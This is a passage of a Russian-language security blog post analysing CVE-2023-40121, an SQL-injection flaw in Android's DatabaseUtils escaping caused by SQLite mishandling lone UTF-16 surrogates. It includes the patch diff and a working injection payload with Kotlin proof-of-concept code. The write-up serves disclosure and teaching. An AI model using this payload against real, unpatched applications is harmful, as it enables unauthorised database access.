</span></span></code></pre></div><p>Если передать в качестве <code>$input</code> последовательность <code>\u0041</code>, то результат будет вполне предсказуем:</p>


<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="/img/cve-2023-40121/over-long-1.jpg" alt="/img/cve-2023-40121/over-long-1.jpg"/>
    </div>
    <a href="/img/cve-2023-40121/over-long-1.jpg" itemprop="contentUrl"></a>
  </figure>
</div>

<p>А вот если передать <code>\u00c2</code> без обязательного следующего байта, то результат будет уже интереснее:</p>


<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="/img/cve-2023-40121/over-long-2.jpg" alt="/img/cve-2023-40121/over-long-2.jpg"/>
    </div>
    <a href="/img/cve-2023-40121/over-long-2.jpg" itemprop="contentUrl"></a>
  </figure>
</div>

<p>Из скриншота видно, что декодер ожидает два символа. Что при определенных условиях, о которых мы поговорим далее приводит к проблеме затирания символа который расположен после такой незавершенной двухбайтовой последовательности.</p>
<h1 id="суррогатные-пары">Суррогатные пары</h1>
<p>Это продукт сумрачного гения мыслителей, которые придумали UTF-16. Если не лезть сильно в дебри, то можно сказать, что суррогатные пары представляют из себя два диапазона, которые называют высоким(high) и низким(low) суррогатами.</p>
<ul>
<li><code>U+D800..U+DBFF</code> - high</li>
<li><code>U+DC00..U+DFFF</code> - low</li>
</ul>
<p>В общем для составления символа нужна пара таких суррогатов, а если передан только один суррогат, то декодер не сможет корректно преобразовать это в символ. Фактически тут сработает тот же принцип как и при декодировании сверхдлинных символов.</p>
<h1 id="разбор-уязвимости">Разбор уязвимости</h1>
<p>Проблема была в методе <code>appendEscapedSQLString</code> класса <code>DatabaseUtils</code>. Вот код, который был до патча:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">appendEscapedSQLString</span><span class="p">(</span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sb</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">sqlString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sqlString</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sqlString</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sqlString</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">sqlString</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Фокус в том, что в этом коде нет уязвимости. Он корректно экранирует кавычки и эффективно предотвращает SQL-инъекции. Обойти этот фильтр с помощью Unicode тоже не выйдет, потому что Java является т.н. &ldquo;unicode aware&rdquo; языком и любые попытки обойти эту фильтрацию с помощью тех же парных суррогатов ни к чему не приведут. Вы просто получите некорректный запрос.</p>
<p>Теперь давайте посмотрим на патч:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">     public static void appendEscapedSQLString(StringBuilder sb, String sqlString) {
</span></span><span class="line"><span class="cl">         sb.append(&#39;\&#39;&#39;);
</span></span><span class="line"><span class="cl"><span class="gd">-        if (sqlString.indexOf(&#39;\&#39;&#39;) != -1) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-            int length = sqlString.length();
</span></span></span><span class="line"><span class="cl"><span class="gd">-            for (int i = 0; i &lt; length; i++) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-                char c = sqlString.charAt(i);
</span></span></span><span class="line"><span class="cl"><span class="gd">-                if (c == &#39;\&#39;&#39;) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-                    sb.append(&#39;\&#39;&#39;);
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+        int length = sqlString.length();
</span></span></span><span class="line"><span class="cl"><span class="gi">+        for (int i = 0; i &lt; length; i++) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+            char c = sqlString.charAt(i);
</span></span></span><span class="line"><span class="cl"><span class="gi">+            if (Character.isHighSurrogate(c)) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                if (i == length - 1) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    continue;
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>                 }
</span></span><span class="line"><span class="cl"><span class="gd">-                sb.append(c);
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+                if (Character.isLowSurrogate(sqlString.charAt(i + 1))) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    // add them both
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    sb.append(c);
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    sb.append(sqlString.charAt(i + 1));
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    continue;
</span></span></span><span class="line"><span class="cl"><span class="gi">+                } else {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    // this is a lone surrogate, skip it
</span></span></span><span class="line"><span class="cl"><span class="gi">+                    continue;
</span></span></span><span class="line"><span class="cl"><span class="gi">+                }
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>             }
</span></span><span class="line"><span class="cl"><span class="gd">-        } else
</span></span></span><span class="line"><span class="cl"><span class="gd">-            sb.append(sqlString);
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+            if (Character.isLowSurrogate(c)) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                continue;
</span></span></span><span class="line"><span class="cl"><span class="gi">+            }
</span></span></span><span class="line"><span class="cl"><span class="gi">+            if (c == &#39;\&#39;&#39;) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                sb.append(&#39;\&#39;&#39;);
</span></span></span><span class="line"><span class="cl"><span class="gi">+            }
</span></span></span><span class="line"><span class="cl"><span class="gi">+            sb.append(c);
</span></span></span><span class="line"><span class="cl"><span class="gi">+        }
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         sb.append(&#39;\&#39;&#39;);
</span></span><span class="line"><span class="cl">     }
</span></span></code></pre></div><p>Помимо экранирования кавычек, были добавлены проверки на то, является ли очередной символ высоким или низким парным суррогатом или нет. Более того, если такой символ используется без своей пары, то он будет просто проигнорирован и не попадет в экранированный вариант запроса. Все это выглядит как защита от эффекта затирания следующего символа (over-consumption) при использовании парных суррогатов, как было сказано выше. Но откуда тут вообще уязвимость и зачем нужна эта защита, если Java корректно работает с Unicode? Проблема находится уровнем ниже, в SQLite, которая <a href="https://gist.github.com/maksverver/c3d5da8a0a9f2ec1c2a225209f290e13">некорректно преобразует</a> некоторые UTF-16 последовательности.</p>
<p>Теперь, собрав вместе всю имеющуюся информацию, можно составить полезную нагрузку приводящую к SQL-инъекции:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;original_request&gt;\ud83d&#39; union select sqlite_version()--
</span></span></code></pre></div><p>И протестировать ее на следующем примере кода:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-kotlin" data-lang="kotlin"><span class="line"><span class="cl"><span class="k">val</span> <span class="py">payload</span> <span class="p">=</span> <span class="s2">&#34;sub</span><span class="se">\ud83d</span><span class="s2">&#39; union select sqlite_version()--&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">sb</span> <span class="p">=</span> <span class="n">StringBuilder</span><span class="p">().</span><span class="n">apply</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">append</span><span class="p">(</span><span class="s2">&#34;select title from entry where subtitle=&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nc">DatabaseUtils</span><span class="p">.</span><span class="n">appendEscapedSQLString</span><span class="p">(</span><span class="n">sb</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">c</span> <span class="p">=</span> <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">db</span><span class="p">.</span><span class="n">rawQuery</span><span class="p">(</span><span class="n">sb</span><span class="p">.</span><span class="n">toString</span><span class="p">(),</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="n">SQLiteException</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span><span class="p">.</span><span class="n">printStackTrace</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">null</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>

<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="/img/cve-2023-40121/exploit.jpg" alt="/img/cve-2023-40121/exploit.jpg"/>
    </div>
    <a href="/img/cve-2023-40121/exploit.jpg" itemprop="contentUrl"></a>
  </figure>
</div>

<p>Как видно из логов, уязвимость была успешно проэксплуатирована. Внимательный читатель уже понял как произошла вся магия. Для невнимательных дам финальное пояснение.</p>
<p>После того, как все одинарные кавычки в строке были успешно экранированы, получился запрос, содержащий высокий суррогат и две кавычки после него. Далее, он был передан в SQLite, которая при конвертации парного суррогата не нашла собственно пару и не придумала ничего лучше как заменить следующий за ним символ на наиболее по ее мнению подходящий. Чем и сломала экранирование так заботливо сделанное методом <code>appendEscapedSQLString</code>.</p>
<h1 id="ссылки">Ссылки</h1>
<ul>
<li><a href="https://kevinboone.me/overlong.html?i=2">UTF-8 and the problem of over-long characters</a></li>
<li><a href="https://websec.github.io/unicode-security-guide/character-transformations/">Unicode Security Guide</a></li>
</ul>

        
          <div class="blog-tags">
            
              <a href="https://fi5t.xyz/tags/mobile/">mobile</a>&nbsp;
            
              <a href="https://fi5t.xyz/tags/android/">android</a>&nbsp;
            
              <a href="https://fi5t.xyz/tags/%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C/">безопасность</a>&nbsp;
            
              <a href="https://fi5t.xyz/tags/cve/">cve</a>&nbsp;
            
          </div>
        

        
            <hr/>
            <section id="social-share">
              <div class="list-inline footer-links">
                

<div class="share-box" aria-hidden="true">
    <ul class="share">
      
      <li>
        <a href="//twitter.com/share?url=https%3a%2f%2ffi5t.xyz%2fposts%2fcve-2023-40121%2f&amp;text=CVE-2023-40121&amp;via=" target="_blank" title="Share on Twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2ffi5t.xyz%2fposts%2fcve-2023-40121%2f" target="_blank" title="Share on Facebook">
          <i class="fab fa-facebook"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//reddit.com/submit?url=https%3a%2f%2ffi5t.xyz%2fposts%2fcve-2023-40121%2f&amp;title=CVE-2023-40121" target="_blank" title="Share on Reddit">
          <i class="fab fa-reddit"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2ffi5t.xyz%2fposts%2fcve-2023-40121%2f&amp;title=CVE-2023-40121" target="_blank" title="Share on LinkedIn">
          <i class="fab fa-linkedin"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2ffi5t.xyz%2fposts%2fcve-2023-40121%2f&amp;title=CVE-2023-40121" target="_blank" title="Share on StumbleUpon">
          <i class="fab fa-stumbleupon"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2ffi5t.xyz%2fposts%2fcve-2023-40121%2f&amp;description=CVE-2023-40121" target="_blank" title="Share on Pinterest">
          <i class="fab fa-pinterest"></i>
        </a>
      </li>
    </ul>
  </div>
  

              </div>
            </section>
        

        
          
            
          

          
                  <h4 class="see-also">Смотрите также</h4>
                  <ul>
                
                
                    <li><a href="/posts/sslpinning-holy-cow/">Святая корова SSL Pinning-а</a></li>
                
                    <li><a href="/posts/how-to-join-mobilesec-2024/">Как вкатиться в безопасность android приложений в 2024</a></li>
                
                    <li><a href="/posts/owasp-mobile-top-ten-2023/">OWASP Mobile Top Ten 2023</a></li>
                
                    <li><a href="/posts/evolution-of-vulnerabilities-in-android-apps/">Эволюция уязвимостей в приложениях для Android</a></li>
                
                    <li><a href="/posts/mobile-apps-security/">Безопасность мобильных приложений и устройств</a></li>
                
              </ul>

          
        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://fi5t.xyz/posts/sslpinning-holy-cow/" data-toggle="tooltip" data-placement="top" title="Святая корова SSL Pinning-а">&larr; Предыдущий</a>
            </li>
          
          
        </ul>
      


      
        
          
          <div class="disqus-comments">
            <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "not-unique-x" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
          </div>
          
        
        
      

    </div>
  </div>
</div>

      
<footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
		
		  <a href="https://github.com/Fi5t" title="GitHub">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
		  <a href="https://www.youtube.com/c/AndroidGuards" title="Youtube">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-youtube fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            <a href="" title="RSS">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              Fi5t
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2024
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://fi5t.xyz">(не)Уникальный опыт</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          На базе <a href="https://gohugo.io">Hugo v0.121.2</a> &nbsp;&bull;&nbsp; Тема <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> на базе <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://fi5t.xyz/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://fi5t.xyz/js/load-photoswipe.js"></script>









    
  </body>
</html>

